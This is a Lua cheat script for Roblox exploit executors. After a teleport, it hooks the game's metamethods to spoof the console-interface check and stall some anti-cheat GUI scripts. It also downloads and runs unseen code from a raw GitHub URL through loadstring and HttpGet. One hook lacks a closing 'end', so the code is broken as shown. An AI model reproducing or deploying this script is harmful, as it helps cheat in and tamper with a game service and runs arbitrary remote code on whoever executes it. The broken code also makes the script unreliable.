local function missing(t, f, fallback)
    if type(f) == t then return f end
    return fallback
end

local queueteleport

queueteleport = missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))

if not queueteleport then
            warn("join Console | queue_on_teleport is not supported on this executor")
            return
        end

        queueteleport([=[
            local LOBBY_PLACE = 10179538382
            local PC_PLACE = 13643807539

            game:GetService("ScriptContext"):SetTimeout(1)

            local function cref(inst)
                if cloneref then
                    return cloneref(inst)
                end
                return inst
            end

            local function protect(fn)
                if newcclosure then
                    return newcclosure(fn)
                end
                return fn
            end

            if game.PlaceId == LOBBY_PLACE then
                local GuiService = cref(game:GetService("GuiService"))
                local UserInputService = cref(game:GetService("UserInputService"))

                local oldNamecall
                oldNamecall = hookmetamethod(game, "__namecall", protect(function(self, ...)
                    local method = getnamecallmethod()

                    local ok, traceback = pcall(debug.traceback)
                    if ok and traceback and traceback:match("PlayerGui") then
                        local lp = game:GetService("Players").LocalPlayer
                        if lp then
                            local sourceName = traceback:gsub(string.format("Players.%s.PlayerGui.", lp.Name), "")
                            if sourceName:len() > 32 then
                                return task.wait(9e9)
                            end
                        end
                    end

                    if method == "IsTenFootInterface" then
                        return true
                    end

                    return oldNamecall(self, ...)
                end))

                local oldIndex
                oldIndex = hookmetamethod(game, "__index", protect(function(self, key)
                    if key == "IsTenFootInterface" then
                        return function()
                            return true
                        end

                    return oldIndex(self, key)
                end))

                pcall(function()
                    hookfunction(GuiService.IsTenFootInterface, protect(function()
                        return true
                    end))
                end)

                pcall(function()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/gilaigla.lua"))()
                end)
            elseif game.PlaceId == PC_PLACE then
                repeat task.wait() until not game.ReplicatedFirst:FindFirstChild("Intro")
                game:GetService("ScriptContext"):SetTimeout(9e9)
            end
        ]=])
